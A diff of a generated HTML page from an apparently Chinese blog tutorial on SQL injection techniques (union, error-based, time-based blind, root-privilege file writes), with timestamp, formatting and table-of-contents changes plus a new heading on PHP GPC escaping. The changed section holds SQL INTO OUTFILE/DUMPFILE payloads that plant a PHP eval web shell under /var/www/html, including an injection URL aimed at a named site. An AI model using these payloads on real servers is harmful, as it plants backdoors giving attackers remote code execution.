@@ -28,7 +28,7 @@
 <meta property="og:description" content="联合查询注入原理union select可以查询两张不同表内的数据（取交集）。前提是前后列数相同，列也必须拥有相同的数据类型。 基本流程 判断注入点   猜字段数 order by  联合查询： union select database(),user() #&#96;&#96;&#96;  获取当前数据库和数据库用户名123456789101112   &#96;&#96;&#96;1&#39; union selec">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-02-14T01:00:45.000Z">
-<meta property="article:modified_time" content="2020-02-14T08:51:10.056Z">
+<meta property="article:modified_time" content="2020-02-14T09:06:59.197Z">
 <meta property="article:author" content="nannanshen">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
@@ -179,7 +179,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-02-14 09:00:45 / 修改时间：16:51:10" itemprop="dateCreated datePublished" datetime="2020-02-14T09:00:45+08:00">2020-02-14</time>
+              <time title="创建时间：2020-02-14 09:00:45 / 修改时间：17:06:59" itemprop="dateCreated datePublished" datetime="2020-02-14T09:00:45+08:00">2020-02-14</time>
             </span>
 
           
@@ -289,11 +289,13 @@
 </li>
 <li><p><code>select &#39;&lt;?php @eval($_POST[pass])?&gt;&#39; into DUMPFILE &#39;/var/www/html/muma.php&#39; ;</code></p>
 </li>
-<li><p>```<br>select * from tdb_goods where goods_id=1 into outfile “/var/www/html/muma.php” LINES STARTING BY ‘<?php @eval($_POST[pass])?>‘ </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   * LINES STARTING BY &#39;写⼊的内容&#39;：设置每⾏数据开头的字符，可以为单个或多个字符。默认情况下不使⽤任何字符。</span><br><span class="line"></span><br><span class="line">   * LINES TERMINATED BY &#39;写⼊的内容&#39;：设置每⾏数据结尾的字符，可以为单个或多个字符。默认值是&quot;\n&quot;。</span><br><span class="line"></span><br><span class="line">## 案例</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;http:&#x2F;&#x2F;www.dark5.net&#x2F;index.php?id&#x3D;1 and 1&#x3D;2 union select 1,2,3,4,&#39;&lt;?php eval($_POST[1])?&gt;&#39;,5 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39; -- a</span><br></pre></td></tr></table></figure></li>
+<li><pre><code>select * from tdb_goods where goods_id=1 into outfile &quot;/var/www/html/muma.php&quot; LINES STARTING BY &apos;&lt;?php @eval($_POST[pass])?&gt;&apos; 
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   * LINES STARTING BY &#39;写⼊的内容&#39;：设置每⾏数据开头的字符，可以为单个或多个字符。默认情况下不使⽤任何字符。</span><br><span class="line"></span><br><span class="line">   * LINES TERMINATED BY &#39;写⼊的内容&#39;：设置每⾏数据结尾的字符，可以为单个或多个字符。默认值是&quot;\n&quot;。</span><br><span class="line"></span><br><span class="line">## 案例</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;http:&#x2F;&#x2F;www.dark5.net&#x2F;index.php?id&#x3D;1 and 1&#x3D;2 union select 1,2,3,4,&#39;&lt;?php eval($_POST[1])?&gt;&#39;,5 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39; -- a</span><br></pre></td></tr></table></figure>
+</code></pre></li>
 </ul>
 </li>
 </ol>
+<h2 id="GPC的问题"><a href="#GPC的问题" class="headerlink" title="GPC的问题"></a>GPC的问题</h2><p>PHP开启GPC以后，会把接收的字符加上反斜杠转义。</p>
 
     </div>
 
@@ -375,7 +377,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#联合查询注入"><span class="nav-number">1.</span> <span class="nav-text">联合查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基本流程"><span class="nav-number">1.2.</span> <span class="nav-text">基本流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#报错注入"><span class="nav-number">2.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理-1"><span class="nav-number">2.1.</span> <span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#延时盲注"><span class="nav-number">3.</span> <span class="nav-text">延时盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理-2"><span class="nav-number">3.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#流程"><span class="nav-number">3.2.</span> <span class="nav-text">流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#root权限处理"><span class="nav-number">4.</span> <span class="nav-text">root权限处理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#条件"><span class="nav-number">4.1.</span> <span class="nav-text">条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#操作"><span class="nav-number">4.2.</span> <span class="nav-text">操作</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#联合查询注入"><span class="nav-number">1.</span> <span class="nav-text">联合查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基本流程"><span class="nav-number">1.2.</span> <span class="nav-text">基本流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#报错注入"><span class="nav-number">2.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理-1"><span class="nav-number">2.1.</span> <span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#延时盲注"><span class="nav-number">3.</span> <span class="nav-text">延时盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理-2"><span class="nav-number">3.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#流程"><span class="nav-number">3.2.</span> <span class="nav-text">流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#root权限处理"><span class="nav-number">4.</span> <span class="nav-text">root权限处理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#条件"><span class="nav-number">4.1.</span> <span class="nav-text">条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#操作"><span class="nav-number">4.2.</span> <span class="nav-text">操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GPC的问题"><span class="nav-number">4.3.</span> <span class="nav-text">GPC的问题</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
